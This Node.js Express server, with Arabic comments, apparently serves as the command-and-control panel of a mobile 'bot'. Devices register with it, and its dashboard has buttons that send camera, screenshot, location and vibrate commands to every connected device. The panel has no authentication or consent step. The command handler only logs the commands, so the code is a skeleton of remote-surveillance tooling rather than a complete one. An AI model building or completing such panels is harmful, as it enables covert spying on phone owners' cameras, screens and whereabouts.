const express = require('express');
const app = express();

app.use(express.json());

// تخزين الأجهزة المتصلة
const connectedDevices = new Map();

// صفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>لوحة تحكم البوت</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                text-align: center;
            }
            .header {
                background: rgba(255,255,255,0.1);
                padding: 30px;
                border-radius: 15px;
                margin-bottom: 20px;
                backdrop-filter: blur(10px);
            }
            .btn {
                background: rgba(255,255,255,0.2);
                border: none;
                padding: 15px 20px;
                border-radius: 10px;
                color: white;
                cursor: pointer;
                margin: 5px;
                font-size: 16px;
            }
            .btn:hover {
                background: rgba(255,255,255,0.3);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 لوحة تحكم البوت</h1>
                <p>الأجهزة المتصلة: <span id="deviceCount">${connectedDevices.size}</span></p>
                <p>🔗 رابط السيرفر: <code>https://hamzaa-tawny.vercel.app</code></p>
            </div>
            
            <div>
                <button class="btn" onclick="sendCommand('vibrate')">📳 اهتزاز</button>
                <button class="btn" onclick="sendCommand('camera')">📸 كاميرا</button>
                <button class="btn" onclick="sendCommand('screenshot')">📺 لقطة</button>
                <button class="btn" onclick="sendCommand('location')">📍 موقع</button>
            </div>
            
            <div id="devicesList" style="margin-top: 20px; text-align: left;">
                ${Array.from(connectedDevices.values()).map(device => 
                    `<div style="background: rgba(255,255,255,0.1); padding: 10px; margin: 5px; border-radius: 5px;">
                        📱 ${device.deviceId} - ${device.model || 'Unknown'}
                    </div>`
                ).join('') || '<p>لا توجد أجهزة متصلة</p>'}
            </div>
        </div>

        <script>
            function sendCommand(command) {
                fetch('/api/send-command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        command: command,
                        target: 'all'
                    })
                })
                .then(r => r.json())
                .then(data => {
                    alert('✅ Command: ' + command);
                });
            }
            
            // تحديث قائمة الأجهزة كل 3 ثواني
            setInterval(() => {
                fetch('/api/devices')
                    .then(r => r.json())
                    .then(devices => {
                        document.getElementById('deviceCount').textContent = devices.length;
                    });
            }, 3000);
        </script>
    </body>
    </html>
  `);
});

// API لتسجيل الجهاز (للتطبيق)
app.post('/api/register-device', (req, res) => {
  const { deviceId, model, version } = req.body;
  
  connectedDevices.set(deviceId, {
    deviceId,
    model,
    version,
    connectedAt: new Date(),
    lastPing: Date.now()
  });
  
  console.log('📱 جهاز متصل:', deviceId);
  
  res.json({
    success: true,
    message: 'Device registered successfully',
    serverUrl: 'https://hamzaa-tawny.vercel.app'
  });
});

// API لإرسال الأوامر (للتطبيق)
app.post('/api/send-command', (req, res) => {
  const { command, target, deviceId } = req.body;
  
  console.log('📩 أمر مستلم:', command, 'لـ', target || deviceId);
  
  if (target === 'all') {
    // إرسال لجميع الأجهزة
    connectedDevices.forEach((device, id) => {
      console.log(`➡️ إرسال ${command} إلى ${id}`);
    });
  } else if (deviceId) {
    // إرسال لجهاز معين
    console.log(`➡️ إرسال ${command} إلى ${deviceId}`);
  }
  
  res.json({
    success: true,
    command: command,
    sentTo: target === 'all' ? connectedDevices.size : 1,
    message: `Command ${command} sent successfully`
  });
});

// API لقائمة الأجهزة
app.get('/api/devices', (req, res) => {
  const devices = Array.from(connectedDevices.values());
  res.json(devices);
});

// API للـ Ping (للتطبيق)
app.get('/api/ping', (req, res) => {
  res.json({
    status: 'online',
    server: 'Vercel',
    timestamp: new Date().toISOString()
  });
});

// ويب هوك البوت
app.post('/webhook', (req, res) => {
  console.log('🤖 ويب هوك مستلم:', req.body);
  res.json({ status: 'received' });
});

// تنظيف الأجهزة المنقطعة
setInterval(() => {
  const now = Date.now();
  connectedDevices.forEach((device, id) => {
    if (now - device.lastPing > 60000) {
      connectedDevices.delete(id);
      console.log('🧹 جهاز منقطع:', id);
    }
  });
}, 30000);

module.exports = app;
